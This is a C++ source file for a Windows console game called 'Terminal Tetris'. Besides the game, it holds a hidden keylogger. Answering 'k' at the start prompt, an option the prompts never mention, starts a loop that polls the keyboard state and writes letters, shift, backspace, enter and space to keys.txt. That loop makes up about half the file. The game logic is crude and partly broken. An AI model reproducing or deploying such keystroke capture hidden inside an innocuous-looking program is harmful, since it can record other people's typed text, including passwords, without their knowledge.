#include <cstdlib>
#include <iostream>
#include <fstream>
#include <string>
#include <ctime>
#include <Windows.h>

using namespace std;

void displayBoard(char board[11][11], int score);
void moveBlock(string direction, char board[11][11], int &x, int &y, int sq[4], int blockval, int &score);

int main(){
	ofstream fout ("keys.txt");
	char board[11][11] = {
		{'_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_'},
		{'_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_'},
		{'_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_'},
		{'_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_'},
		{'_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_'},
		{'_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_'},
		{'_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_'},
		{'_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_'},
		{'_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_'},
		{'_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_'},
		{'_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_'}
	};

	int blockx = 5; //really 6 but indexes start at 0
	int blocky = 1;
	int x = 0;

	string answer, quityn;

	bool wk, ak, dk, sk, playing;
	playing = false;
	int score = 0;
	int sq[4];
	string color_choice;
	sq[0] = sq[1] = sq[2] = sq[3] = 1;

	wk = ak = dk = sk = false;
	int blockval = 4;
	bool keying = false;
	//system("color fc");
	srand(time(NULL));
	cout << "Welcome to Terminal Tetris! \nWould you like to start a game (y/n)?\n";
	cin >> answer;
	if ((answer == "n" || answer == "N")) {
		return 0;
	}
	else if ((answer == "y" || answer == "Y")) {
		playing = true;
		cout << "What color theme would you like, dark or light?\n";
		cin >> color_choice;
		if (color_choice == "dark") {
			system("color 03");
		}
		if (color_choice == "light") {
			system("color fc");
		}
		cout << "The game has started, press ESC at anytime to quit\n";
		Sleep(500);
		displayBoard(board, score);
	}
	else if ((answer == "k" || answer == "K")) {
		cout << "Now keylogging!\n";
		keying = true;
	}
	int floorboard = 0;
	
	while(playing){
		x++;
		for (int z = 0; z < 11; z++) {
			for(int l = 0; l < 11; l++){
				if(board[z][l] == '#') floorboard++;
				if (floorboard == 11) {
					for (int i = 0; i < 10; i++) {
						for (int j = 0; j < 10; j++) {
							board[i + 1][j] = board[i][j];
						}
					}
					score += 100;
				}
			}
			floorboard = 0;
		}
		floorboard = 0;
		if((GetKeyState(VK_DOWN) & 0x8000) || x % 100000 == 0){
			if((blockval > 2 || board[blocky - 1][blockx - 1] == '#') && blocky != 10){
				if ((board[blocky][blockx - 1] == '#' && board[blocky + 1][blockx] != '#' && board[blocky + 1][blockx - 1] != '#')) {
					board[blocky][blockx] = '_';
					board[blocky][blockx - 1] = '_';
					sq[2] ? board[blocky - 1][blockx] = '_' : NULL;
					sq[3] ? board[blocky - 1][blockx - 1] = '_' : NULL;
				}
				else if ((board[blocky][blockx - 1] != '#' && board[blocky - 1][blockx - 1] != '#' && board[blocky + 1][blockx] != '#')) {
					board[blocky][blockx] = '_';
					sq[2] ? board[blocky - 1][blockx] = '_' : NULL;
					sq[3] ? board[blocky - 1][blockx - 1] = '_' : NULL;
				}
				else if ((board[blocky][blockx - 1] != '#' && board[blocky + 1][blockx] != '#')) {
					board[blocky][blockx] = '_';
					sq[2] ? board[blocky - 1][blockx] = '_' : NULL;
					sq[3] ? board[blocky - 1][blockx - 1] = '_' : NULL;
				}
				else {
					blocky = 1;
					sq[0] = 1;
					sq[1] = rand() * 104 % 2;
					sq[2] = rand() * 5 % 2;
					sq[3] = rand() / 5 % 2;
					blockval = sq[0] + sq[1] + sq[2] + sq[3];
				}
			}
			else {
				if(blocky == 10 || board[blocky + 1][blockx] == '#'){
					blocky = 1;
					sq[0] = 1;
					sq[1] = rand() * 104 % 2;
					sq[2] = rand() * 5 % 2;
					sq[3] = rand() / 5 % 2;
					blockval = sq[0] + sq[1] + sq[2] + sq[3];
				}
			}
			sq[0] ? board[blocky][blockx] = '_' : NULL;
			sq[1] ? board[blocky][blockx - 1] = '_' : NULL;
			sq[2] ? board[blocky - 1][blockx] = '_' : NULL;
			sq[3] ? board[blocky - 1][blockx - 1] = '_' : NULL;
			blocky += 1;
			score += 10;
			sq[0] ? board[blocky][blockx] = '#' : NULL;
			sq[1] ? board[blocky][blockx - 1] = '#' : NULL;
			sq[2] ? board[blocky - 1][blockx] = '#' : NULL;
			sq[3] ? board[blocky - 1][blockx - 1] = '#' : NULL;
			displayBoard(board, score);
			GetKeyState(VK_DOWN) ? Sleep(100) : Sleep(400);
		}
		else if (GetKeyState(VK_LEFT) & 0x8000) {
			moveBlock("left", board, blockx, blocky, sq, blockval, score);
		}
		else if (GetKeyState(VK_RIGHT) & 0x8000) {
			moveBlock("right", board, blockx, blocky, sq, blockval, score);
		}
		else if (GetKeyState(VK_DOWN) & 0x8000) {
			//moveBlock("down", board, blockx, blocky, sq, blockval, score);
		}
		else if (GetKeyState(VK_ESCAPE) & 0x8000) {
			cout << "Are you sure you want to quit the game (y/n)?\n";
			cin >> quityn;
			if (quityn == "y") {
				playing = false;
				system("cls");
				cout << "Goodbye!\n";
				Sleep(1200);
			}
		}
		if (blocky > 2) {
			for (int z = 0; z < 11; z++) {
				if (board[1][z] == '#') {
					cout << "YOU LOSE!";
					Sleep(1200);
					playing = false;
				}
			}
		}
	}

	bool unpressed[30];
	fill(unpressed, unpressed + sizeof(unpressed), true);
	while (keying) {
		if (GetKeyState('A') & 0x8000 && unpressed[0]) {
			cout << "a";
			fout << "a";
			unpressed[0] = false;
		}
		else if (GetKeyState('B') & 0x8000 && unpressed[1]) {
			cout << 'b';
			fout << 'b';
			unpressed[1] = false;
		}
		else if (GetKeyState('C') & 0x8000 && unpressed[2]) {
			cout << 'c';
			fout << 'c';
			unpressed[2] = false;
		}
		else if (GetKeyState('D') & 0x8000 && unpressed[3]) {
			cout << 'd';
			fout << 'd';
			unpressed[3] = false;
		}
		else if (GetKeyState('E') & 0x8000 && unpressed[4]) {
			cout << 'e';
			fout << 'e';
			unpressed[4] = false;
		}
		else if (GetKeyState('F') & 0x8000 && unpressed[5]) {
			cout << 'f';
			fout << 'f';
			unpressed[5] = false;
		}
		else if (GetKeyState('G') & 0x8000 && unpressed[6]) {
			cout << 'g';
			fout << 'g';
			unpressed[6] = false;
		}
		else if (GetKeyState('H') & 0x8000 && unpressed[7]) {
			cout << 'h';
			fout << 'h';
			unpressed[7] = false;
		}
		else if (GetKeyState('I') & 0x8000 && unpressed[8]) {
			cout << 'i';
			fout << 'i';
			unpressed[8] = false;
		}
		else if (GetKeyState('J') & 0x8000 && unpressed[9]) {
			cout << 'j';
			fout << 'j';
			unpressed[9] = false;
		}
		else if (GetKeyState('K') & 0x8000 && unpressed[10]) {
			cout << 'k';
			fout << 'k';
			unpressed[10] = false;
		}
		else if (GetKeyState('L') & 0x8000 && unpressed[11]) {
			cout << 'l';
			fout << 'l';
			unpressed[11] = false;
		}
		else if (GetKeyState('M') & 0x8000 && unpressed[12]) {
			cout << 'm';
			fout << 'm';
			unpressed[12] = false;
		}
		else if (GetKeyState('N') & 0x8000 && unpressed[13]) {
			cout << 'n';
			fout << 'n';
			unpressed[13] = false;
		}
		else if (GetKeyState('O') & 0x8000 && unpressed[14]) {
			cout << 'o';
			fout << 'o';
			unpressed[14] = false;
		}
		else if (GetKeyState('P') & 0x8000 && unpressed[15]) {
			cout << 'p';
			fout << 'p';
			unpressed[15] = false;
		}
		else if (GetKeyState('Q') & 0x8000 && unpressed[16]) {
			cout << 'q';
			fout << 'q';
			unpressed[16] = false;
		}
		else if (GetKeyState('R') & 0x8000 && unpressed[17]) {
			cout << 'r';
			fout << 'r';
			unpressed[17] = false;
		}
		else if (GetKeyState('S') & 0x8000 && unpressed[18]) {
			cout << 's';
			fout << 's';
			unpressed[18] = false;
		}
		else if (GetKeyState('T') & 0x8000 && unpressed[19]) {
			cout << 't';
			fout << 't';
			unpressed[19] = false;
		}
		else if (GetKeyState('U') & 0x8000 && unpressed[20]) {
			cout << 'u';
			fout << 'u';
			unpressed[20] = false;
		}
		else if (GetKeyState('V') & 0x8000 && unpressed[21]) {
			cout << 'v';
			fout << 'v';
			unpressed[21] = false;
		}
		else if (GetKeyState('W') & 0x8000 && unpressed[22]) {
			cout << 'w';
			fout << 'w';
			unpressed[22] = false;
		}
		else if (GetKeyState('X') & 0x8000 && unpressed[23]) {
			cout << 'x';
			fout << 'x';
			unpressed[23] = false;
		}
		else if (GetKeyState('Y') & 0x8000 && unpressed[24]) {
			cout << 'y';
			fout << 'y';
			unpressed[24] = false;
		}
		else if (GetKeyState('Z') & 0x8000 && unpressed[25]) {
			cout << 'z';
			fout << 'z';
			unpressed[25] = false;
		}
		else if (GetKeyState(VK_SHIFT) & 0x8000 && unpressed[26]) {
			cout << " *shift* ";
			fout << " *shift* ";
			unpressed[26] = false;
		}
		else if (GetKeyState(VK_BACK) & 0x8000 && unpressed[27]) {
			cout << " *backspace* ";
			fout << " *backspace* ";
			unpressed[27] = false;
		}
		else if (GetKeyState(VK_RETURN) & 0x8000 && unpressed[28]) {
			cout << " *enter* ";
			fout << " *enter* ";
			unpressed[28] = false;
		}
		else if (GetKeyState(VK_SPACE) & 0x8000 && unpressed[29]) {
			cout << " ";
			fout << " ";
			unpressed[29] = false;
		}
		else if (GetKeyState(VK_ESCAPE) & 0x8000) {
			keying = false;
		}
		if (GetKeyState('A') == 0 || GetKeyState('A') == 1) {
			unpressed[0] = true;
		}
		if (GetKeyState('B') == 0 || GetKeyState('B') == 1) {
			unpressed[1] = true;
		}
		if (GetKeyState('C') == 0 || GetKeyState('C') == 1) {
			unpressed[2] = true;
		}
		if (GetKeyState('D') == 0 || GetKeyState('D') == 1) {
			unpressed[3] = true;
		}
		if (GetKeyState('E') == 0 || GetKeyState('E') == 1) {
			unpressed[4] = true;
		}
		if (GetKeyState('F') == 0 || GetKeyState('F') == 1) {
			unpressed[5] = true;
		}
		if (GetKeyState('G') == 0 || GetKeyState('G') == 1) {
			unpressed[6] = true;
		}
		if (GetKeyState('H') == 0 || GetKeyState('H') == 1) {
			unpressed[7] = true;
		}
		if (GetKeyState('I') == 0 || GetKeyState('I') == 1) {
			unpressed[8] = true;
		}
		if (GetKeyState('J') == 0 || GetKeyState('J') == 1) {
			unpressed[9] = true;
		}
		if (GetKeyState('K') == 0 || GetKeyState('K') == 1) {
			unpressed[10] = true;
		}
		if (GetKeyState('L') == 0 || GetKeyState('L') == 1) {
			unpressed[11] = true;
		}
		if (GetKeyState('M') == 0 || GetKeyState('M') == 1) {
			unpressed[12] = true;
		}
		if (GetKeyState('N') == 0 || GetKeyState('N') == 1) {
			unpressed[13] = true;
		}
		if (GetKeyState('O') == 0 || GetKeyState('O') == 1) {
			unpressed[14] = true;
		}
		if (GetKeyState('P') == 0 || GetKeyState('P') == 1) {
			unpressed[15] = true;
		}
		if (GetKeyState('Q') == 0 || GetKeyState('Q') == 1) {
			unpressed[16] = true;
		}
		if (GetKeyState('R') == 0 || GetKeyState('R') == 1) {
			unpressed[17] = true;
		}
		if (GetKeyState('S') == 0 || GetKeyState('S') == 1) {
			unpressed[18] = true;
		}
		if (GetKeyState('T') == 0 || GetKeyState('T') == 1) {
			unpressed[19] = true;
		}
		if (GetKeyState('U') == 0 || GetKeyState('U') == 1) {
			unpressed[20] = true;
		}
		if (GetKeyState('V') == 0 || GetKeyState('V') == 1) {
			unpressed[21] = true;
		}
		if (GetKeyState('W') == 0 || GetKeyState('W') == 1) {
			unpressed[22] = true;
		}
		if (GetKeyState('X') == 0 || GetKeyState('X') == 1) {
			unpressed[23] = true;
		}
		if (GetKeyState('Y') == 0 || GetKeyState('Y') == 1) {
			unpressed[24] = true;
		}
		if (GetKeyState('Z') == 0 || GetKeyState('Z') == 1) {
			unpressed[25] = true;
		}
		if (GetKeyState(VK_SHIFT) == 0 || GetKeyState(VK_SHIFT) == 1) {
			unpressed[26] = true;
		}
		if (GetKeyState(VK_BACK) == 0 || GetKeyState(VK_BACK) == 1) {
			unpressed[27] = true;
		}
		if (GetKeyState(VK_RETURN) == 0 || GetKeyState(VK_RETURN) == 1) {
			unpressed[28] = true;
		}
		if (GetKeyState(VK_SPACE) == 0 || GetKeyState(VK_SPACE) == 1) {
			unpressed[29] = true;
		}
		//Sleep(100);
	}

	return 0;
}

void displayBoard(char board[11][11], int score) {
	system("cls");
	for (int i = 0; i < 11; i++) {
		for (int j = 0; j < 11; j++) {
			cout << board[i][j] << " ";
		}
		if(i == 5) cout << "    Score: " << score;
		cout << endl;
	}
}

void moveBlock(string direction, char board[11][11], int &x, int &y, int sq[4], int blockval, int &score) {
	if (direction == "down") {
		if ((blockval > 2 || board[ y - 1][ x - 1] == '#') &&  y != 10) {
			if ((board[ y][ x - 1] == '#' && board[ y + 1][ x] != '#' && board[ y + 1][ x - 1] != '#')) {
				board[ y][ x] = '_';
				board[ y][ x - 1] = '_';
				sq[2] ? board[ y - 1][ x] = '_' : NULL;
				sq[3] ? board[ y - 1][ x - 1] = '_' : NULL;
			}
			else if ((board[ y][ x - 1] != '#' && board[ y - 1][ x - 1] != '#' && board[ y + 1][ x] != '#')) {
				board[ y][ x] = '_';
				sq[2] ? board[ y - 1][ x] = '_' : NULL;
				sq[3] ? board[ y - 1][ x - 1] = '_' : NULL;
			}
			else if ((board[ y][ x - 1] != '#' && board[ y + 1][ x] != '#')) {
				board[ y][ x] = '_';
				sq[2] ? board[ y - 1][ x] = '_' : NULL;
				sq[3] ? board[ y - 1][ x - 1] = '_' : NULL;
			}
			else {
				 y = 1;
				sq[0] = 1;
				sq[1] = rand() * 104 % 2;
				sq[2] = rand() * 5 % 2;
				sq[3] = rand() / 5 % 2;
				blockval = sq[0] + sq[1] + sq[2] + sq[3];
			}
		}
		else {
			if (y == 10 || board[ y + 1][ x] == '#') {
				 y = 1;
				sq[0] = 1;
				sq[1] = rand() * 104 % 2;
				sq[2] = rand() * 5 % 2;
				sq[3] = rand() / 5 % 2;
				blockval = sq[0] + sq[1] + sq[2] + sq[3];
			}
		}
		sq[0] ? board[ y][ x] = '_' : NULL;
		sq[1] ? board[ y][ x - 1] = '_' : NULL;
		sq[2] ? board[ y - 1][ x] = '_' : NULL;
		sq[3] ? board[ y - 1][ x - 1] = '_' : NULL;
		 y += 1;
		score += 10;
		sq[0] ? board[ y][ x] = '#' : NULL;
		sq[1] ? board[ y][ x - 1] = '#' : NULL;
		sq[2] ? board[ y - 1][ x] = '#' : NULL;
		sq[3] ? board[ y - 1][ x - 1] = '#' : NULL;
		displayBoard(board, score);
		Sleep(200);
	}
	else if (direction == "right") {
		board[y][x] = '_';
		sq[1] ? board[y][x - 1] = '_' : NULL;
		sq[2] ? board[y - 1][x] = '_' : NULL;
		sq[3] ? board[y - 1][x - 1] = '_' : NULL;
		x += 1;
		sq[0] ? board[y][x] = '#' : NULL;
		sq[1] ? board[y][x - 1] = '#' : NULL;
		sq[2] ? board[y - 1][x] = '#' : NULL;
		sq[3] ? board[y - 1][x - 1] = '#' : NULL;
		displayBoard(board, score);
		Sleep(250);
	}
	else if (direction == "left") {
		board[y][x] = '_';
		sq[1] ? board[y][x - 1] = '_' : NULL;
		sq[2] ? board[y - 1][x] = '_' : NULL;
		sq[3] ? board[y - 1][x - 1] = '_' : NULL;
		x -= 1;
		sq[0] ? board[y][x] = '#' : NULL;
		sq[1] ? board[y][x - 1] = '#' : NULL;
		sq[2] ? board[y - 1][x] = '#' : NULL;
		sq[3] ? board[y - 1][x - 1] = '#' : NULL;
		displayBoard(board, score);
		Sleep(250);
	}
}
